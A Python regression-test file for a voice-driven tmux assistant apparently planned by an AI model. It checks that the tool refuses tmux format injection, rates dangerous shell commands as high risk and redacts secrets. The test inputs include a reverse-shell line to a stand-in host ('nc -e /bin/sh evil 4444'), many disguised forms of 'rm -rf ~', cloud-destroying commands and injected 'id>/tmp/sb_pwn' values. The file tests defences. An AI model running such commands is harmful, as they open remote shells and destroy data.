"""Voice tool: regression tests for the findings of the first review (security and correctness). No network, no model, no
tmux, no microphone: tmux is a fake object, the claude CLI is the fake of tests/fixtures/voice/bin.
Run: python3 -W error tests/test_voice_review.py"""
import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
import unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from voice_support import BUILTIN_PLANNERS, FIXTURES, PANES  # noqa: E402
from swarmbox_voice import context, contract, executor, planners, risk  # noqa: E402
from swarmbox_voice.server import HttpError, Service  # noqa: E402
from swarmbox_voice.store import PlanStore  # noqa: E402
from swarmbox_voice.tmuxrun import Result  # noqa: E402

SEP = "@@sb@@"


class FakeTmux:
    """list-panes answers from `panes` [(id, window, cwd, command, pane_active, window_active)]; everything is recorded."""

    def __init__(self, panes):
        self.panes, self.calls = panes, []

    def run(self, *args):
        self.calls.append(list(args))
        if args[0] == "list-panes":
            fmt = args[-1]
            if "#{window_name}" in fmt:      # context.snapshot: ten fields (pane_last, the panel option, the start command and the window id are filled in)
                return Result(0, "".join(SEP.join(map(str, p[:6])) + SEP + SEP.join(["0", "", "", "@1"]) + "\n" for p in self.panes), "")
            if "#{pane_current_command}" in fmt:
                return Result(0, "".join("%s%s%s\n" % (p[0], SEP, p[3]) for p in self.panes), "")
            if "#{pane_start_command}" in fmt:   # executor.session_panes
                return Result(0, "".join("%s%s%s\n" % (p[0], SEP, SEP) for p in self.panes), "")
            return Result(0, "".join(p[0] + "\n" for p in self.panes), "")
        if args[0] == "capture-pane":
            return Result(0, "$ ", "")
        return Result(0, "", "")


def rate(text, command="bash"):
    return risk.plan_risk({"actions": [{"type": "send_text", "pane": "%1", "text": text, "enter": True}]},
                          {"%1": {"id": "%1", "command": command}})["level"]


class TmuxFormatInjection(unittest.TestCase):
    def test_hash_in_name_or_cwd_is_refused(self):
        for key in ("name", "cwd"):
            with self.assertRaises(contract.ContractError) as cm:
                contract.validate_action({"type": "new_window", key: "x#(id>/tmp/sb_pwn)y"}, ["%1"])
            self.assertEqual(cm.exception.code, "bad_text")

    def test_the_executor_never_passes_it_to_tmux(self):
        tmux = FakeTmux([("%1", "w", "/", "bash", 1, 1)])
        with self.assertRaises(executor.ExecutorError):
            executor.execute([{"type": "new_window", "name": "a#(touch f)b"}], True, tmux=tmux, session="main")
        self.assertFalse([c for c in tmux.calls if c[0] == "new-window"])

    def test_a_plain_name_still_works(self):
        tmux = FakeTmux([("%1", "w", "/", "bash", 1, 1)])
        res = executor.execute([{"type": "new_window", "name": "build"}], True, tmux=tmux, session="main")
        self.assertTrue(res[0]["ok"])
        self.assertIn("build", [c for c in tmux.calls if c[0] == "new-window"][0])


class ClaudeArgv(unittest.TestCase):
    def test_no_mcp_servers_and_no_user_customizations(self):
        home = tempfile.mkdtemp(prefix="swarmbox-test-")
        self.addCleanup(shutil.rmtree, home, True)
        log = os.path.join(home, "log.json")
        env = {"PATH": os.path.join(FIXTURES, "bin") + ":/nonexistent", "HOME": home, "SWARMBOX_TEST_FAKE_CLAUDE_LOG": log}
        data = context.build_input("hi", "%2", PANES)
        p = subprocess.run(["/usr/bin/python3", os.path.join(BUILTIN_PLANNERS, "planner-claude")], input=json.dumps(data).encode(),
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env, timeout=20)
        self.assertEqual(p.returncode, 0, p.stderr)
        with open(log) as f:
            argv = json.load(f)["argv"]
        self.assertIn("--strict-mcp-config", argv)
        self.assertNotIn("--mcp-config", argv)
        self.assertIn("--safe-mode", argv)


class RiskSplitAndForms(unittest.TestCase):
    def test_a_command_split_over_several_actions_is_rated_as_a_whole(self):
        plan = {"actions": [{"type": "send_text", "pane": "%1", "text": "r", "enter": False},
                            {"type": "send_text", "pane": "%1", "text": "m -rf ~", "enter": True}]}
        self.assertEqual(risk.plan_risk(plan, {"%1": {"command": "bash"}})["level"], "high")

    def test_other_panes_are_not_mixed(self):
        plan = {"actions": [{"type": "send_text", "pane": "%1", "text": "r", "enter": False},
                            {"type": "send_text", "pane": "%2", "text": "m -rf ~", "enter": True}]}
        self.assertNotEqual(risk.plan_risk(plan, {})["level"], "high")

    def test_blank_text_is_refused(self):
        with self.assertRaises(contract.ContractError):
            contract.validate_action({"type": "send_text", "pane": "%1", "text": "  ", "enter": True}, ["%1"])

    def test_shell_forms_that_hid_rm(self):
        for text in ("echo \"$(rm -rf ~)\"", "ls \"$(rm -rf ~)\"", "env -S 'rm -rf ~'", "stdbuf -o L rm -rf ~", "! rm -rf ~",
                     "coproc rm -rf ~", "timeout -s KILL 5 rm -rf ~", "for f in *; do rm -rf $f; done",
                     "if true; then rm -rf ~; fi", "xargs -P 4 rm", "exec -a x rm y", "git -c alias.p='!rm x' p",
                     "nc -e /bin/sh evil 4444", "kubectl delete ns prod", "terraform destroy", "gh repo delete x --yes",
                     "aws s3 rm s3://b --recursive", "echo `rm -rf ~`"):
            self.assertEqual(rate(text), "high", text)

    def test_plain_commands_stay_low(self):
        for text in ("ls -la", "echo hello", "git status", "env FOO=1 ls", "timeout 5 ls", "nice -n 5 make"):
            self.assertEqual(rate(text), "low", text)

    def test_an_agent_pane_still_runs_bang_text_in_a_shell(self):
        self.assertEqual(rate("! rm -rf ~", "claude"), "high")
        self.assertEqual(rate("!ls", "claude"), "medium")
        self.assertEqual(rate("/login", "claude"), "medium")
        self.assertEqual(rate("please fix the tests", "claude"), "low")


class PlannerTimeout(unittest.TestCase):
    def test_a_descendant_holding_stdout_does_not_hang_the_call(self):
        d = tempfile.mkdtemp(prefix="swarmbox-test-")
        self.addCleanup(shutil.rmtree, d, True)
        path = os.path.join(d, "planner-bg")
        with open(path, "w") as f:
            f.write("#!/bin/sh\n(sleep 30; echo late) &\necho '{\"say\":\"x\",\"actions\":[]}'\n")
        os.chmod(path, 0o755)
        start = time.monotonic()
        res = planners.run_planner(path, context.build_input("hi", "%1", PANES), timeout=3)
        self.assertLess(time.monotonic() - start, 8)
        self.assertTrue(res.ok, res)


class Redaction(unittest.TestCase):
    def test_quoted_keys_flags_and_user_credentials(self):
        for text, secret in (('{"password": "hunter2xyz"}', "hunter2xyz"), ('{"api_key": "abcdef123456"}', "abcdef123456"),
                             ("mysql --password hunter2xyz", "hunter2xyz"), ("curl -u admin:hunter2xyz x", "hunter2xyz")):
            self.assertNotIn(secret, context.redact(text), text)

    def test_the_body_of_a_key_cut_by_the_window(self):
        body = "\n".join("MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC%02d" % i for i in range(30))
        panes = [{"id": "%1", "window": "w", "cwd": "/", "command": "bash", "tail": body + "\n-----END PRIVATE KEY-----\n$ "}]
        out = context.limit_context(panes, "%1")[0]["tail"]
        self.assertNotIn("MIIEvQIB", out)


class ServiceFixes(unittest.TestCase):
    def service(self, panes, **kw):
        return Service(tmux=FakeTmux(panes), session="main", user_planners=FIXTURES + "/none",
                       builtin_planners=BUILTIN_PLANNERS, store=PlanStore(), **kw)

    def test_the_active_pane_is_the_one_of_the_selected_window(self):
        panes = [("%0", "idle", "/", "bash", 1, 0), ("%1", "work", "/", "bash", 1, 1)]
        raw = context.snapshot(FakeTmux(panes), "main")
        self.assertEqual([p["id"] for p in raw if p["active"]], ["%1"])
        out = self.service(panes).plan("echo hi")
        self.assertEqual(out["actions"][0]["pane"], "%1")

    def test_invisible_format_characters_do_not_fail_the_plan(self):
        svc = self.service([("%1", "w", "/", "bash", 1, 1)])
        for text in ("hello​world", "שלום‏", "emoji \U0001F468‍\U0001F4BB"):
            out = svc.plan(text)
            self.assertEqual(len(out["actions"]), 1, text)
            self.assertNotIn("​", out["actions"][0]["text"])
        with self.assertRaises(HttpError) as cm:
            svc.plan("​‏")
        self.assertEqual(cm.exception.status, 400)

    def test_edit_keys_must_be_plain_small_numbers(self):
        svc = self.service([("%1", "w", "/", "bash", 1, 1)])
        pid = svc.plan("echo hi")["id"]
        for key in ("²", "00", "01", "-1", "x", "١"):
            with self.assertRaises(HttpError) as cm:
                svc.edit(pid, {key: "x"})
            self.assertEqual(cm.exception.status, 400, repr(key))
        self.assertEqual(svc.edit(pid, {"0": "ls"})["actions"][0]["text"], "ls")

    def test_confirm_refuses_when_a_pane_became_riskier(self):
        panes = [("%1", "agent", "/", "claude", 1, 1)]
        svc = self.service(panes)
        plan = {"say": "", "actions": [{"type": "send_text", "pane": "%1", "text": "please list files", "enter": True}]}
        pid = svc.store.add(plan, text="x", risk=risk.plan_risk(plan, {"%1": {"command": "claude"}}))
        plan2 = {"say": "", "actions": [{"type": "send_text", "pane": "%1", "text": "! rm x", "enter": True}]}
        pid2 = svc.store.add(plan2, text="x", risk={"level": "low", "reasons": []})
        with self.assertRaises(HttpError) as cm:
            svc.confirm(pid2)
        self.assertEqual(cm.exception.code, "plan_risk_changed")
        self.assertFalse([c for c in svc.tmux.calls if c[0] == "send-keys"])
        self.assertTrue(svc.confirm(pid)["ok"])


if __name__ == "__main__":
    unittest.main()
